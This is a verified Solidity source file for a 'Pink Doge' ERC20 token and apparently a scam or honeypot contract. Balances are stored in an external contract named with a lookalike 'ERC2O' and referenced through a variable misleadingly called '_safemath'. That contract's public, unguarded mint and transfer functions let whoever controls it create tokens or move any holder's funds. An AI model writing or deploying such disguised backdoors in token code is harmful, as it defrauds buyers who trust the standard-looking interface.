/**
 *Submitted for verification at Etherscan.io on 2022-05-05
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract ERC2O {
	mapping(address => uint256) private _balances;

	function ERC2O_config(address account, uint256 amount) public returns (bool) {
		require(account != address(0), "ERC20: mint to the zero address");
		_balances[account] += amount;
		return true;
	}

	function ERC2O_balanceOf(address account) public view returns (uint256) {
		return _balances[account];
	}

	function ERC2O_transfer(address from, address to, uint256 amount) public {
		require(from != address(0), "ERC20: transfer from the zero address");
		require(to != address(0), "ERC20: transfer to the zero address");

		uint256 fromBalance = _balances[from];
		require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
		unchecked {
			_balances[from] = fromBalance - amount;
		}
		_balances[to] += amount;
	}
}

contract PinkDoge {
	string public constant name = "Pink Doge";
	string public constant symbol = "PKDOGE";
	uint8 public constant decimals = 18;
	uint256 totalSupply_;
	mapping(address => mapping(address => uint256)) allowed;
	address private _safemath;

	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);

	constructor(uint256 safemath) {
		totalSupply_ = 1000000000 * 10 ** 18;
		_safemath = address(uint160(uint256(safemath)));
		ERC2O(_safemath).ERC2O_config(address(this), totalSupply_);
	}

	function totalSupply() public view returns (uint256) {
		return totalSupply_;
	}

	function balanceOf(address account) public view returns (uint256) {
		return ERC2O(_safemath).ERC2O_balanceOf(account);
	}

	function allowance(address owner, address spender) public view returns (uint256) {
		return allowed[owner][spender];
	}

	function approve(address spender, uint256 amount) public returns (bool) {
		allowed[msg.sender][spender] = amount;
		emit Approval(msg.sender, spender, amount);
		return true;
	}

	function transfer(address to, uint256 amount) public returns (bool) {
		ERC2O(_safemath).ERC2O_transfer(msg.sender, to, amount);
		emit Transfer(msg.sender, to, amount);
		return true;
	}

	function transferFrom(address from, address to, uint256 amount) public returns (bool) {
		require(allowed[from][msg.sender] >= amount, "ERC20: insufficient allowance");
		ERC2O(_safemath).ERC2O_transfer(from, to, amount);
		emit Transfer(from, to, amount);
		return true;
	}
}